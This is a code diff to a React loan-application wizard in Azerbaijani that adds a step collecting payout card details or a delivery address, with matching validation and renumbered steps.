@@ -23,9 +23,10 @@ export const HomePage = ({
     { id: 2, title: 'Kredit', icon: Calculator },
     { id: 3, title: 'Təklif', icon: FileText },
     { id: 4, title: 'Çatdırılma', icon: Building2 },
-    { id: 5, title: 'Video', icon: Video },
-    { id: 6, title: 'İmza', icon: FileText },
-    { id: 7, title: 'Təsdiq', icon: CheckCircle }
+    { id: 5, title: 'Ünvan/Kart', icon: CreditCard },
+    { id: 6, title: 'Video', icon: Video },
+    { id: 7, title: 'İmza', icon: FileText },
+    { id: 8, title: 'Təsdiq', icon: CheckCircle }
   ];
 
   const handleInputChange = (e) => {
@@ -58,12 +59,22 @@ export const HomePage = ({
       if (!formData.deliveryMethod) newErrors.deliveryMethod = 'Çatdırılma seçilməlidir';
     }
     if (currentStep === 5) {
-      if (!formData.videoRecorded || !videoApproved) newErrors.video = 'Video təsdiqlənməlidir';
+      if (formData.deliveryMethod === 'card') {
+        if (!formData.cardNumber || formData.cardNumber.length !== 16) newErrors.cardNumber = 'Kart nömrəsi 16 rəqəm olmalıdır';
+        if (!formData.cardHolder.trim()) newErrors.cardHolder = 'Kart sahibinin adı tələb olunur';
+        if (!formData.cardExpiry || formData.cardExpiry.length !== 5) newErrors.cardExpiry = 'Tarix düzgün deyil (MM/YY)';
+      } else if (formData.deliveryMethod === 'home' || formData.deliveryMethod === 'branch') {
+        if (!formData.address.trim()) newErrors.address = 'Ünvan tələb olunur';
+        if (!formData.city.trim()) newErrors.city = 'Şəhər tələb olunur';
+      }
     }
     if (currentStep === 6) {
-      if (!formData.documentSigned) newErrors.documentSigned = 'Sənəd imzalanmalıdır';
+      if (!formData.videoRecorded || !videoApproved) newErrors.video = 'Video təsdiqlənməlidir';
     }
     if (currentStep === 7) {
+      if (!formData.documentSigned) newErrors.documentSigned = 'Sənəd imzalanmalıdır';
+    }
+    if (currentStep === 8) {
       if (!formData.finalOtp.trim() || formData.finalOtp.length !== 6) newErrors.finalOtp = 'OTP 6 rəqəm olmalıdır';
     }
     
@@ -433,6 +444,146 @@ export const HomePage = ({
 
         {currentStep === 5 && (
           <div>
+            {formData.deliveryMethod === 'card' && (
+              <div>
+                <h3 className="text-2xl font-bold mb-6">Kart Məlumatları</h3>
+                <p className="text-gray-600 mb-6">Kredit məbləğinin köçürüləcəyi kart məlumatlarını daxil edin:</p>
+                
+                <div className="space-y-6">
+                  <div>
+                    <label className="block text-sm font-medium mb-2">Kart nömrəsi <span className="text-red-500">*</span></label>
+                    <input
+                      type="text"
+                      name="cardNumber"
+                      value={formData.cardNumber}
+                      onChange={(e) => {
+                        const value = e.target.value.replace(/\D/g, '');
+                        if (value.length <= 16) {
+                          handleInputChange({ target: { name: 'cardNumber', value } });
+                        }
+                      }}
+                      maxLength="16"
+                      className={`w-full px-4 py-3 border rounded-lg text-lg tracking-wider ${errors.cardNumber ? 'border-red-500' : 'border-gray-300'}`}
+                      placeholder="1234 5678 9012 3456"
+                    />
+                    {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-medium mb-2">Kart sahibinin adı <span className="text-red-500">*</span></label>
+                    <input
+                      type="text"
+                      name="cardHolder"
+                      value={formData.cardHolder}
+                      onChange={handleInputChange}
+                      className={`w-full px-4 py-3 border rounded-lg uppercase ${errors.cardHolder ? 'border-red-500' : 'border-gray-300'}`}
+                      placeholder="AD SOYAD"
+                    />
+                    {errors.cardHolder && <p className="text-red-500 text-sm mt-1">{errors.cardHolder}</p>}
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-medium mb-2">Son istifadə tarixi <span className="text-red-500">*</span></label>
+                    <input
+                      type="text"
+                      name="cardExpiry"
+                      value={formData.cardExpiry}
+                      onChange={(e) => {
+                        let value = e.target.value.replace(/\D/g, '');
+                        if (value.length >= 2) {
+                          value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                        }
+                        if (value.length <= 5) {
+                          handleInputChange({ target: { name: 'cardExpiry', value } });
+                        }
+                      }}
+                      maxLength="5"
+                      className={`w-full px-4 py-3 border rounded-lg text-lg tracking-wider ${errors.cardExpiry ? 'border-red-500' : 'border-gray-300'}`}
+                      placeholder="MM/YY"
+                    />
+                    {errors.cardExpiry && <p className="text-red-500 text-sm mt-1">{errors.cardExpiry}</p>}
+                  </div>
+
+                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+                    <div className="flex items-start space-x-3">
+                      <Shield className="text-blue-600 flex-shrink-0 mt-1" size={20} />
+                      <p className="text-sm text-gray-700">
+                        Kart məlumatlarınız tam təhlükəsizdir və yalnız köçürmə əməliyyatı üçün istifadə olunacaq.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {(formData.deliveryMethod === 'home' || formData.deliveryMethod === 'branch') && (
+              <div>
+                <h3 className="text-2xl font-bold mb-6">
+                  {formData.deliveryMethod === 'home' ? 'Çatdırılma Ünvanı' : 'Filial Ünvanı'}
+                </h3>
+                <p className="text-gray-600 mb-6">
+                  {formData.deliveryMethod === 'home' 
+                    ? 'Kuryer məbləği çatdıracaq ünvanı daxil edin:' 
+                    : 'Məbləği götürəcəyiniz filialın ünvanını qeyd edin:'}
+                </p>
+                
+                <div className="space-y-6">
+                  <div>
+                    <label className="block text-sm font-medium mb-2">Şəhər <span className="text-red-500">*</span></label>
+                    <input
+                      type="text"
+                      name="city"
+                      value={formData.city}
+                      onChange={handleInputChange}
+                      className={`w-full px-4 py-3 border rounded-lg ${errors.city ? 'border-red-500' : 'border-gray-300'}`}
+                      placeholder="Bakı"
+                    />
+                    {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-medium mb-2">Tam ünvan <span className="text-red-500">*</span></label>
+                    <textarea
+                      name="address"
+                      value={formData.address}
+                      onChange={handleInputChange}
+                      rows="3"
+                      className={`w-full px-4 py-3 border rounded-lg ${errors.address ? 'border-red-500' : 'border-gray-300'}`}
+                      placeholder="Küçə, ev, mərtəbə, mənzil"
+                    ></textarea>
+                    {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-medium mb-2">Poçt kodu (istəyə görə)</label>
+                    <input
+                      type="text"
+                      name="postalCode"
+                      value={formData.postalCode}
+                      onChange={handleInputChange}
+                      className="w-full px-4 py-3 border border-gray-300 rounded-lg"
+                      placeholder="AZ1000"
+                    />
+                  </div>
+
+                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
+                    <div className="flex items-start space-x-3">
+                      <Building2 className="text-blue-600 flex-shrink-0 mt-1" size={20} />
+                      <p className="text-sm text-gray-700">
+                        {formData.deliveryMethod === 'home' 
+                          ? 'Kuryer 1-2 iş günü ərzində sizinlə əlaqə saxlayacaq.' 
+                          : 'Filialdan götürmə üçün şəxsiyyət vəsiqəniz lazımdır.'}
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+        )}
+
+        {currentStep === 8 && (
+          <div>
             <h3 className="text-2xl font-bold mb-6">Video Qeydiyyat</h3>
             <div className="max-w-2xl mx-auto">
               <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
@@ -606,7 +757,7 @@ export const HomePage = ({
             </button>
           )}
           
-          {currentStep < 7 && currentStep !== 3 && !odmRejected && (
+          {currentStep < 8 && currentStep !== 3 && !odmRejected && (
             <button
               onClick={nextStep}
               className="flex items-center space-x-2 px-6 py-3 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-700 transition ml-auto"
@@ -616,7 +767,7 @@ export const HomePage = ({
             </button>
           )}
 
-          {currentStep === 7 && (
+          {currentStep === 8 && (
             <button
               onClick={handleSubmit}
               className="flex items-center space-x-2 px-8 py-3 bg-green-600 text-white rounded-lg font-semibold hover:bg-green-700 transition ml-auto"
